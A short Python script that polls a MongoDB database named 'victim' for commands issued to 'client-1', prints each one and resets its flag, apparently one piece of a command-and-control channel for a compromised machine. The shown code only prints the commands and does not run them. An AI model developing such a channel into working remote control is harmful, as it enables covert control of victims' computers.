# data={
# "_id": 'client-1',
# "input": command,
# "output": "",
# "isIssued": True
# }

import pymongo as p

client = p.MongoClient('mongodb://localhost:27017')
db = client['victim']
collection = db['vic_det']


while True:
    
    df=collection.find_one({"_id": 'client-1'})
    if df["isIssued"]==True:
        print(df["input"])
        prev = {"_id": 'client-1'}
        nextt = {'$set': {"isIssued": False}}
        n = collection.update_many(prev, nextt)
